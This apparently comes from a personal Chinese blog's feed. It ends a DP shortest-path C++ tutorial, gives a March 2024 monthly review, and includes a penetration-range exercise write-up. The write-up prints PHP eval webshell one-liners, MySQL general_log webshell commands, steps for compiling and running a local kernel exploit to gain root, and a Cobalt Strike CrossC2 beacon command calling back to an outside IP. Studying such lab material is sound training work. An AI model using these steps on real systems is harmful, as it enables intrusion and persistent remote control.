class="comment">//最优子结构：f(P)=min&#123;f(R)+W(R,P)&#125;，其中R是P的前驱结点，W(R,P)是边R-&gt;P的权值。</span></span><br><span class="line">        <span class="comment">//无后效性：f(P)只与P的前驱结点有关，与P的后继结点无关。</span></span><br><span class="line">        <span class="comment">//这里从起点开始处理，通过比较从该顶点到起点的最短距离v-&gt;distance和到邻居顶点的距离neighbor.second，</span></span><br><span class="line">        <span class="comment">// 和邻居顶点到起点的最短距离distance，来维护distance属性，更新邻居顶点的距离，</span></span><br><span class="line">        <span class="comment">// 从起点到每个顶点的最短距离推导出到终点的最短距离，即满足最优子结构</span></span><br><span class="line">        <span class="comment">// 从起点到每个顶点的最短距离只与前驱结点v-&gt;distance有关，与后继结点无关，即满足无后效性</span></span><br><span class="line">        <span class="comment">// 这样就满足了最优子结构和无后效性。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Graph <span class="title">Init_graph</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;请输入顶点数：&quot;</span>;</span><br><span class="line">    cin&gt;&gt;num;</span><br><span class="line">    <span class="function">Graph <span class="title">graph</span><span class="params">(num)</span></span>;</span><br><span class="line">    <span class="type">int</span> from, to, weight;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;请输入边的起点、终点和权重（以-1 -1 -1结束）：&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">        cin&gt;&gt;from&gt;&gt;to&gt;&gt;weight;</span><br><span class="line">        <span class="keyword">if</span>(from==<span class="number">-1</span>&amp;&amp;to==<span class="number">-1</span>&amp;&amp;weight==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        graph.<span class="built_in">addDirectedEdge</span>(from, to, weight);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> graph;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个带权有向无环图</span></span><br><span class="line">    <span class="comment">// Graph graph=Init_graph();</span></span><br><span class="line">    <span class="function">Graph <span class="title">graph</span><span class="params">(<span class="number">13</span>)</span></span>;</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">9</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">2</span>, <span class="number">7</span>, <span class="number">2</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">3</span>, <span class="number">7</span>, <span class="number">7</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">4</span>, <span class="number">8</span>, <span class="number">11</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">5</span>, <span class="number">8</span>, <span class="number">8</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">6</span>, <span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">7</span>, <span class="number">9</span>, <span class="number">4</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">7</span>, <span class="number">10</span>, <span class="number">3</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">8</span>, <span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">8</span>, <span class="number">11</span>, <span class="number">6</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">9</span>, <span class="number">12</span>, <span class="number">4</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">10</span>, <span class="number">12</span>, <span class="number">2</span>);</span><br><span class="line">    graph.<span class="built_in">addDirectedEdge</span>(<span class="number">11</span>, <span class="number">12</span>, INT_MAX/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 求从顶点0到顶点5的最短路径</span></span><br><span class="line">    <span class="keyword">auto</span> timeStart = chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> shortestViolence = graph.<span class="built_in">shortestPathByViolence</span>(<span class="number">1</span>, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> timeEnd = chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">    <span class="keyword">auto</span> duration = timeEnd - timeStart;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Shortest distance by violence from vertex 1 to vertex 5: &quot;</span></span><br><span class="line">         &lt;&lt; shortestViolence &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;And the time cost is:&quot;</span> &lt;&lt; duration.<span class="built_in">count</span>() &lt;&lt; <span class="string">&quot;ms&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    timeStart = chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> shortest = graph.<span class="built_in">shortestPath</span>(<span class="number">1</span>, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    timeEnd = chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">    duration = timeEnd - timeStart;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Shortest distance from vertex 1 to vertex 5: &quot;</span> &lt;&lt; shortest &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;And the time cost is:&quot;</span> &lt;&lt; duration.<span class="built_in">count</span>() &lt;&lt; <span class="string">&quot;ms&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="想说的话"><a class="markdownIt-Anchor" href="#想说的话"></a> 想说的话</h2><p>其实这点内容远不足以学习到动态规划的精髓，但由于时间关系，我目前只写了这么多。其实对于算法的学习而言，多刷题永远是最有效的方法。多实践，把抽象的思想转化为具体的solution，从而对算法的思想有更深入的了解，避免纸上谈兵。</p><p>目前只更新了DAG最短路问题，其实涉及到动态规划算法的经典问题还有很多，诸如矩阵连乘、最长公共子序列等问题我都还没来得及更新，希望日后刷题时会补上<s>才不会鸽了呢</s>。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/56475bad5af636d0f03dc7aac3b1d87d.jpeg" alt="56475bad5af636d0f03dc7aac3b1d87d" /></p>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 动态规划 </tag>
            
            <tag> DP </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> DAG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3月总结·2024</title>
      <link href="/posts/b50e8c107ef5/"/>
      <url>/posts/b50e8c107ef5/</url>
      
        <content type="html"><![CDATA[<h1 id="3月总结2024"><a class="markdownIt-Anchor" href="#3月总结2024"></a> 3月总结·2024</h1><p>博客在三月份几乎没有更新过……其实不是博主偷懒，而是实在太忙，便放下了一个月。特此更新每月总结系列，时时鞭策反思。</p><h2 id="比赛篇"><a class="markdownIt-Anchor" href="#比赛篇"></a> 比赛篇</h2><h3 id="大创-人脸识别系统-前端设计"><a class="markdownIt-Anchor" href="#大创-人脸识别系统-前端设计"></a> 大创-人脸识别系统-前端设计</h3><p>来源是某位巨佬同学，承接了他们实验室的一个项目暨他的论文开题报告，可以说是已经十拿九稳，只差最后的些许润色与优化。笔者主要负责项目的前端优化部分。项目是基于Python的flask框架搭建的一个小网站，核心代码已经给出，剩下的只是一些接口的调度。说是优化，其实不过就是个模板，光是部署项目到本地就花了一个星期，再优化了一个小bug之后就没什么事了。可以说投入精力不多，也没收获什么知识。但是几乎白嫖了一个论文三作和项目成果，该说不说还是挺赚的。</p><p>其实这种不涉及核心技术的挂名项目除了在综测上会有加分之外，对于求职简历来说帮助不大，面试官一问就露馅了。今后还是要努力多参加一些掌握核心部分的项目，争取让精力更有性价比。</p><h3 id="大创-智慧医疗平台-平台架构"><a class="markdownIt-Anchor" href="#大创-智慧医疗平台-平台架构"></a> 大创-智慧医疗平台-平台架构</h3><p>也是同学邀请加入的一个项目组，我的任务是用Python开发一个初步实现文件上传与下载的小平台。该说不说我的投入还是挺大的，学到了挺多新知识：git的使用、Github协同开发、flask框架、数据库基础等。</p><p>但是很可惜，项目黄了，理由是老师认为我们代码功底还是不行，得继续沉淀……这点我也没异议。但是很可惜，有投入却没有产出，虽然积累了一部分项目经验，但中道崩殂的感觉还是挺不好受的。</p><h3 id="高校大数据挑战赛"><a class="markdownIt-Anchor" href="#高校大数据挑战赛"></a> 高校大数据挑战赛</h3><p>一个对点学长拉我打的比赛，内容涉及到机器学习、数据清洗、特征处理等的比赛。很多知识我都完全没接触过，在草草读了一篇机器学习的论文后就轻装上阵了，结果也不出意料的很惨。因为没有前置知识的基础，我基本上是面向GPT编程，三天花光了我一个月的GPT4额度（o(╥﹏╥)o）。不过还是艰难地啃下了前三题。</p><p>很诡异的事情就是我感觉虽然我有和两个学长在组队，但是只有我一个人在写代码……我也不是很想承认这一点就是了。结果也是理所当然的卡死在了最后一问，论文没交上去，功亏一篑，前期的努力全打了水漂，让人扼腕叹息。</p><h3 id="华为软件精英挑战赛"><a class="markdownIt-Anchor" href="#华为软件精英挑战赛"></a> 华为软件精英挑战赛</h3><p>这个是最让我叹息的……由于前几个比赛的耽搁，开赛的第一个星期没怎么重视，而后开始集中开发的时候，别人都已经前64强了……但其实也还好，进度能跟上。我们大概花了三天的时间规划软件架构，用三天的时间用Python开发出了程序。知识涉及多机器人的路径规划，机器人调度，避障防碰撞算法等。我也初步学习了解了诸如A*指路算法、BFS涂色连通等算法知识。</p><p>但是随后的debug则遇到了大麻烦，因为Python是一门交互式动态语言，很多bug在开发时是察觉不到的，而这就给我们后续调试埋下了一颗大炸弹。我们失败的原因主要有三：一是时间不足，前一个星期基本在忙其他的；二是人手不足，拉我们组队的队长本身编程实力较弱，并不能胜任比赛的要求，于是只有我和另一位同学再昼夜倒班，筋疲力竭；三是思想错误，虽然使用的是面向对象编程的Python语言，但我们还是下意识的在用编写C的方法去管理Python——比如用下标而不是直接用对象管理数组，这让我们后期苦不堪言。于是在学校作业与比赛ddl层层逼近，避障算法从头开发、人手不足的三重压力下我们的程序便永远止步于雏形了，只差最后一步却无法亮剑。虽然进一步掌握了协同开发和Python编程的思想，却仍然功败垂成，满腔努力付诸东流。</p><h2 id="书籍篇"><a class="markdownIt-Anchor" href="#书籍篇"></a> 书籍篇</h2><h3 id="go语言圣经"><a class="markdownIt-Anchor" href="#go语言圣经"></a> Go语言圣经</h3><p>初步开始学习Go语言，并有把它发展成我的第二（没准还是第一）语言的想法。起步较晚，三月下旬才开始阅读，目前还在第一章。能把网络编程放在这么前面的新手教学书真是绝无仅有（笑），也难为我这个小白了。</p><p>目前感觉Go语言语法理解起来还是有点难度，尤其是每个函数调用必带的<code>if err!= nil</code>更是让我觉得有些许臃肿。不过经高人（舍友）指点，Go语言并不难学，于是还是有自信继续看下去的。</p><p>*注：高人，rust之神，目前字节跳动旗下飞书开发实习准备中。</p><h3 id="csapp"><a class="markdownIt-Anchor" href="#csapp"></a> CSAPP</h3><p>早就听闻这本书晦涩难懂却又不得不学。目前只啃了50+页，有多少效果我都不好说。考虑去看CMU15-213，配合视频学习。</p><p>第一章大体介绍了计算机的一些架构，快速过了一遍，不过大多都记不住。第二章开始将底层的数据存储方式，用C语言给出示范，还是能够理解的，不过感觉不太重要，正在快速阅读中。</p><h3 id="算法导论"><a class="markdownIt-Anchor" href="#算法导论"></a> 算法导论</h3><p>算法课的时候看了一会，一句话评价：含金量拉满，可读性一坨。实在不适合单枪匹马去看，起码研究生再回头来慢慢啃吧。很多地方都花了大篇幅去讲数学的公式推导，大部分都是离散、微积分、概率论等，伪代码也不如C语言好懂。考虑换一本书自学。</p><p>其实算法的学习不需要啃很多大部头，据高人（舍友）指点没事上leetcode上刷几道题就行了。当然如果要深入学习，还是有书籍指导最好（他本人就在看剑指offer）</p><h3 id="离散-概率论"><a class="markdownIt-Anchor" href="#离散-概率论"></a> 离散、概率论</h3><p>目前的知识还不难，靠高三的老底都能跟上。不过高三的老底也没剩多少就是了（笑）。</p><p>虽然两者前期都从集合论讲起，但概率论感觉更偏对统计问题的模型研究，离散数学则开始和线性代数产生千丝万缕的联系。</p><h3 id="首无作崇之物"><a class="markdownIt-Anchor" href="#首无作崇之物"></a> *首无作崇之物</h3><p>朋友推荐的推理小说。一个字，绝。不愧为推理小说的无冕之王，看完后立马在京东上下单了典藏版作为收藏兼纪念。</p><p>封面相当惊艳，和惊险刺激的文章互为映衬。作中作的写作手法也是一大亮点，模糊了现实与故事的界限，仿佛那份惊悚赫然就在眼前。号称“三十七个谜题,只凭着一个真相,就可以全部解开!”，绝对让人惊叹连连的一本书。</p><h3 id="占星术杀人魔法"><a class="markdownIt-Anchor" href="#占星术杀人魔法"></a> *占星术杀人魔法</h3><p>也是据说很有名的一本推理小说，经常霸榜前三的人气冠军。但是依我之见有点过于拖沓，就和朋友评价的一样“注水严重”。</p><p>目前只看了一半，看完再做评价。</p><h2 id="项目篇"><a class="markdownIt-Anchor" href="#项目篇"></a> 项目篇</h2><h3 id="创新资助计划"><a class="markdownIt-Anchor" href="#创新资助计划"></a> 创新资助计划</h3><p>申报了华为资助下的WAF绕过安全测试技术研究，光是填写申请书就花了我两天的时间，更别说前期挑选项目的时间了。项目难度偏大，基本上不是本科生能独立完成的。个人态度悲观，大概率申请不上。一旦申请成功，就有5w经费+1w奖金，在梦里想想就好吧。</p><h3 id="开源项目重写计划"><a class="markdownIt-Anchor" href="#开源项目重写计划"></a> 开源项目重写计划</h3><p>一个重写开源项目底层、中间件的比赛，目前还没有头绪，但有老师指导和学长带队，暂且观望一波。</p><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><h3 id="中心湖志愿垃圾清洁组织"><a class="markdownIt-Anchor" href="#中心湖志愿垃圾清洁组织"></a> 中心湖志愿垃圾清洁组织</h3><p>万恶的院会又伸出了罪恶的爪牙，组织同学们去公园捡垃圾。策划案、物资什么的统统没有，全部是在活动当天筹集完毕的，不可不谓之惊险。当天晚上还下了大雷暴雨，喜提落汤鸡。</p><h3 id="面试西山居"><a class="markdownIt-Anchor" href="#面试西山居"></a> 面试·西山居</h3><p>刚好碰上面向应届生和实习生的双选会，斗胆拿前一天写好的职业规划课作业的简历去试了试西山居的面试。当场就被拷打爆了。个人感觉可能有二三十分钟，但客观事件估计也就五分钟左右。因为招聘意向职位是渗透工程师和安全服务工程师，所以问的问题都偏Web安全，和我的CTF赛道重合，但是因为没有提前准备八股仍然被拷打的惨不忍睹。问的问题诸如：简述SQL注入的产生逻辑，发生在应用层还是数据库层，华为的研究项目进展如何，简单介绍反序列化漏洞，文件上传漏洞以及植入webshell的利用方法和功能等。看起来都挺基础，但要在现场做到有条有理的回答其实还是挺难的。最后在第二位hr发现我其实是大二的学生后就停止了，这就算是我第一次面试经历吧。</p><p>询问后得知安全行业果然还是要多去实战，研究渗透方面的知识，多去靶场学习。并且在安全行业也会重视学历，研究生的起薪必然会比本科生更高。果然提升学历也是提高自己不可或缺的一环。</p><h2 id="随便写点"><a class="markdownIt-Anchor" href="#随便写点"></a> 随便写点</h2><p>我经常会感觉有一种无力感，担心自己将来一事无成。有时候觉得自己有了些许成就，可和比我厉害的人交流后，又总会感觉到自己的无知，还有同挫败一同到来的激励。</p><p>其实我挺羡慕旁边的同龄人的，因为他们看起来是那么的无忧无虑，似乎拥有一个幸福的未来是理所当然的事情。但我不行，我深知自己平平无奇，背负太多。有时候这种本应化作屈辱或是自卑这种蚕食人心的情感却一直支撑着我，就像根基没有搭好的叠叠高一样——明明摇摇欲坠，却因为有碍事的积木撑起，奇迹般的维持着平衡。</p><p>这个月看似忙了挺多，却鲜有成果，其实挺失败的，但一个月的辛劳确是货真价实。越到月末，就愈发想要逃离。累不止是挂在嘴边，确实深深切切体会到了疲惫。</p><p>但是对我来说，事情可远远不算结束。毕竟春天才刚刚开始，我也不能这么消沉下去。</p><p><strong>结尾还是要积极一点，彼方始有荣光在，荣耀尽在彼方。</strong></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/4ee07d93e2515fc33fd8f9f5dcaf207.jpg" alt="4ee07d93e2515fc33fd8f9f5dcaf207" /></p>]]></content>
      
      
      <categories>
          
          <category> 月度总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024训练营内部网络安全攻防演练复盘</title>
      <link href="/posts/63bcec7459ad/"/>
      <url>/posts/63bcec7459ad/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>经过为时五天的渗透实战培训，在最后一天举行了一场内部小型攻防演练。虽然说形式较为简陋，但也是我参与的第一场实战。赛后不禁感慨，网安之路博大精深，单单CTF离实战还有很长的距离。就像博主本以为走的Web方向，学习渗透应该绰绰有余，实则不然。在具体的攻防演练中，有关Web的知识无非就是文件上传，日志注入get shell，中间件注入等。但这些最多只能让你拿到一台内网机器的权限，而要如何提权，绕过杀软，横向攻击，打穿内网等又涉及到很多在CTF中接触不到的Web深层知识、计算机网络组成、繁杂的工具使用甚至还有二进制。总之，这次攻防演练是很有复盘一遍的必要的，现此编撰本文。</p><h2 id="准备"><a class="markdownIt-Anchor" href="#准备"></a> 准备</h2><p>在开放靶场前，训练营放出了大致的靶机拓扑图。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225205435811.png" alt="image-20240225205435811" style="zoom:67%;" /><p>可以看到，靶场分为三层。在拿下第一层的任意一台主机权限后，都需要进行端口扫描，探测深一层次的内网主机。但是这部分内容由于我们先前从未训练过，所以在有限的时间内进展不太理想。不过第一层的三台主机倒是全部被轻松拿下（存疑），最后也是扫描到了第二层的机器并发现系统存在永恒之蓝漏洞，虽然没有足够的时间去利用漏洞破解，但是能够做到这么多笔者也已经十分满足了。</p><p>比赛开始前，选手需要手动配置IP，连接靶场。</p><p>做好准备后，渗透之旅就正式开始了。</p><h2 id="开始渗透"><a class="markdownIt-Anchor" href="#开始渗透"></a> 开始渗透</h2><p>首先比赛给出了三个分配的IP：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.110.101</span><br><span class="line">192.168.110.102</span><br><span class="line">192.168.110.103</span><br></pre></td></tr></table></figure><p>需要注意的是这三个IP并不像CTF环境一样都可以直接打开。因为比赛只给出了靶机的IP地址，并未给出通信端口。一般的http通信都是默认使用80端口，但靶场IP并不一定使用默认端口，所以此时如果直连IP靶场可能会无法打开。所以，我们需要对IP段进行扫描，常见的工具有nmap或者fscan。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20240225210457.png" style="zoom:67%;" /><p>扫描结果如上，可知连接的URL应为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.110.101:8080/</span><br><span class="line">http://192.168.110.102:7001/</span><br><span class="line">http://192.168.110.103/</span><br></pre></td></tr></table></figure><p>信息收集结束，接下来针对具体的靶机进行攻击。</p><h3 id="靶机一"><a class="markdownIt-Anchor" href="#靶机一"></a> 靶机一</h3><h4 id="弱口令"><a class="markdownIt-Anchor" href="#弱口令"></a> 弱口令</h4><p>第一个靶机是一个用WordPress搭建的个人博客。使用dirsearch进行扫描，可以发现<code>/wp-login.php</code>。访问之，是一个登录界面。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225211009340.png" alt="image-20240225211009340" style="zoom:50%;" /><p>像这种没有回显的登录界面，基本可以排除SQL注入了。我的猜测是弱口令，实际上除了弱口令爆破，还可以去查询博客的默认密码。猜测用户名admin，密码123456，成功进入后台。（ps：笔者当时猜的是12345，没过就放弃了转而用bp爆破，结果愣是直到下午才进去）</p><h4 id="植入webshell"><a class="markdownIt-Anchor" href="#植入webshell"></a> 植入webshell</h4><p>进入后台后，分析页面可以来到博客的外观编辑器下，可以直接写入PHP代码，于是写入一句话木马<code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_REQUEST['shell']); phpinfo(); highlight_file();?&gt;');?&gt;</code>完成注入。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225211424459.png" alt="image-20240225211424459" style="zoom:50%;" /><p>由于写入的模块是<code>comment.php</code>，需要在主页加载一次评论区后才能成功执行，然后再访问<code>/wordpress/shell.php</code>，可以看到成功写入webshell。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225211745550.png" alt="image-20240225211745550" style="zoom:50%;" /><p>接下来再用蚁剑连接webshell即可获得该台靶机权限。</p><p>这里其实出了一点小插曲，在我们植入webshell后，手动RCE可以成功执行，但是蚁剑却无法连接，并且回显报错为<code>“DEPTH_ZERO_SELF_SIGNED_CERT”</code>。一开始我猜测是蚁剑获得权限所用的函数被机器禁用了，但是随后查阅资料得知是因为该靶机证书不可信，导致蚁剑连接失败。在蚁剑的“其他设置”下勾选“忽略HTTP证书”即可。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225212359378.png" alt="image-20240225212359378" style="zoom:50%;" /><p>连接到靶机后，在蚁剑开启虚拟终端，输入<code>whoami</code>指令回显<code>deamon</code>。并不是最高权限，也就是说此处需要提权到root。</p><h4 id="linux提权"><a class="markdownIt-Anchor" href="#linux提权"></a> Linux提权</h4><p>同样在虚拟终端下，输入指令<code>uname -a</code>来获取机器的详细信息，目的是查询机器使用的linux内核版本号，然后再根据版本号去搜索相应的漏洞脚本。这里机器回显linux内核版本号是3.13.0。</p><p>获取到版本号后，再去kali中执行命令<code>searchsploit 3.13.0</code>搜索相关内核版本的提权源码。当然也可以去网上找，但内容和kali中的脚本基本上是一样的。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">searchsploit 3.13.0</span><br></pre></td></tr></table></figure><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20240225213448.png" style="zoom:67%;" /><p>这里我们可以使用脚本<code>37292.c</code>，依次输入以下指令即可。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate linux/local/37292.c //获取脚本路径</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/37292.c ~/Desktop //将脚本移动至桌面方便调取</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225213739339.png" alt="image-20240225213739339" /></p><p>之后，通过蚁剑将脚本上传至靶机<code>tmp</code>目录下，打开虚拟终端，依次使用以下指令编译和执行脚本。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc 37292.c -o exp //编译文件，生成可执行exp脚本</span><br><span class="line"><span class="built_in">chmod</span> 777 exp //给exp赋权</span><br><span class="line">./exp //执行脚本，获得root权限</span><br><span class="line"><span class="built_in">whoami</span> //再次执行<span class="built_in">whoami</span>指令查看用户权限</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20240225214348.png" alt="" /></p><p>可以看到此时我们的用户权限成功变为root，然后再修改机器密码登录服务器即可拿下靶机一。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修改密码</span><br><span class="line">passwd root</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20240225214810.png" alt="" /></p><p>成功拿下入口一。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20240225214909.png" alt="" /></p><p>接着生成Linux上线木马。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./genCrossC2.Linux 192.168.110.64 443 .cobaltstrike.beacon_keys null Linux x64 ./shell.out</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20240225215002.png" alt="" /></p><p>完成。</p><h4 id="小小结"><a class="markdownIt-Anchor" href="#小小结"></a> 小小结</h4><p>总结靶机一的渗透思路，首先用弱口令进入后台，然后更改模板写入webshell，用蚁剑连接获得命令执行权。再在蚁剑中打开虚拟终端，进行信息搜集后利用现有poc进行提权操作，最后修改服务器密码获得控制权。</p><p>实际上笔者在提权脚本那一步就出现了问题，同样的脚本，用gcc编译后赋权执行，我的靶机却报错<code>sh: 0: can't access tty; job control turned off</code>导致exp无法正常提权，于是便卡在了这一步。即使赛后笔者也百思不得其解，希望以后有大佬能浇浇。</p><h3 id="靶机二"><a class="markdownIt-Anchor" href="#靶机二"></a> 靶机二</h3><p>进入靶机，可以得到以下界面。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225215638009.png" alt="image-20240225215638009" /></p><p>这里在获取到主机权限前，有两种解法。</p><h4 id="解法一"><a class="markdownIt-Anchor" href="#解法一"></a> 解法一</h4><h5 id="数据库弱口令"><a class="markdownIt-Anchor" href="#数据库弱口令"></a> 数据库弱口令</h5><p>通过御剑扫描器扫描后台，发现<code>/phpmyadmin</code>页面。尝试访问，页面是一个数据库登录界面。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225220038599.png" alt="image-20240225220038599" style="zoom:50%;" /><p>同样的，使用弱口令进行绕过，用户名与密码均为<code>root</code>成功登录后台。</p><h5 id="植入webshell-2"><a class="markdownIt-Anchor" href="#植入webshell-2"></a> 植入webshell</h5><p>在SQL查询页面中，可以直接执行以下命令即可日志getshell，前提是需要root权限和绝对路径写入权限。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log = on;//开启全局日志记录</span><br><span class="line">set global general_log_file = &#x27;C:/phpStudy/www/shell.php&#x27;;//这里需要知道网站路径，将日志路径改写到网页下</span><br><span class="line">select &#x27;&lt;?php @eval($_REQUEST[x]);?&gt;&#x27;;//执行一句话查询语句，日志自动写入</span><br><span class="line">set global general_log = off;//关闭全局日志**划重点**</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/db45bae4f290e573f6dab997c22c1d5.png" alt="db45bae4f290e573f6dab997c22c1d5" /></p><p>其实还有一个看似不那么重要却十分致命的问题：<strong>我们如何获取数据库的文件路径？</strong></p><p>切到先前的php探针界面，这里已经列出了数据库的绝对路径，顺便告诉了我们靶机系统是windows。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225222112963.png" alt="image-20240225222112963" /></p><p>这种方法可以称为慢日志查询。实际上使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%long_query_time%&#x27;;//查询系统时间</span><br></pre></td></tr></table></figure><p>这里没有修改时间就直接注入了，也许是环境系统时间不为10秒，又或者是已经被修改，总之如果有一个十秒的限制可以把一句话语句改写如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);//延时11秒</span><br></pre></td></tr></table></figure><p>写入成功后，访问日志文件<code>/shell.php</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225221638860.png" alt="image-20240225221638860" /></p><p>可以看到一句话已经成功被执行，接下来用蚁剑连接webshell即可。</p><h4 id="解法二"><a class="markdownIt-Anchor" href="#解法二"></a> 解法二</h4><h5 id="yxcms弱口令"><a class="markdownIt-Anchor" href="#yxcms弱口令"></a> YXcms弱口令</h5><p>访问<code>/yxcms</code>可以进入到一个yxcms内容管理系统下的界面，并且不难发现登录界面。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225223137229.png" alt="image-20240225223137229" style="zoom:50%;" /><p>弱口令admin/123456直接进入后台。</p><h5 id="植入webshell-3"><a class="markdownIt-Anchor" href="#植入webshell-3"></a> 